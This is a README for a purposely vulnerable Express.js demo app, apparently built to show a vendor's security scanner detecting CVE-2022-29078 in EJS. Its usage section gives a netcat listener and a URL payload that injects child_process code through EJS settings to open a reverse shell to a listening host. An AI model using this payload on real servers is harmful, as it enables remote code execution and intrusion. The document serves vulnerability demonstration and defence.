# VulnExpress demo

[![Frogbot Scan Repository](https://github.com/muldos/ejs-frog-demo/actions/workflows/frogbot-scan-repository.yaml/badge.svg)](https://github.com/muldos/ejs-frog-demo/actions/workflows/frogbot-scan-repository.yaml)

## Overview
This a demo Express JS application to illustrate how a critical vulnerability can be exploited and how it could have been detected and remediated using [Jfrog Advanced Security](https://jfrog.com/advanced-security/) new features.


   <img src="https://github.com/muldos/vuln-express/raw/master/images/home.png" alt="Home page overview" width="100%" style="margin: 20px;"/>

## Build the project and the docker image

Build the project

`npm install`

Run it locally

`npm start`

Build the docker image

`docker build . -t vuln-ejs:latest`

Run it

`docker run -p 3000:3000 vuln-ejs:latest`

## Usage

1 - With netcat start listening on a given host, on the port 1337 for example

`nc -lv 1337`

Then we will exploit CVE-2022-29078 RCE to create a remote shell by issuing the following command in the container

```ncat host.docker.internal 1337 -e /bin/bash```

Note : pay attention that the netcat command may differs between the host OS & the container's distro (in macosx is it `nc`, while in the container it is `ncat`)


2 - To do that you will exploit the vulnerabilities using the following url 

`http://localhost:3000/?id=David&settings[view%20options][outputFunctionName]=x;process.mainModule.require(%27child_process%27).execSync(%27ncat%20host.docker.internal%201337%20-e%20/bin/bash%27);s`

Replace `host.docker.internal` if needed, to open your remote shell where your step 1 netcat processing is listening.

![Exploit overview](/images/exploited.png)

To trigger the exploit : 

open a terminal and run 

`nc -lv 1337`

Then use the link in the application to open the web shell.
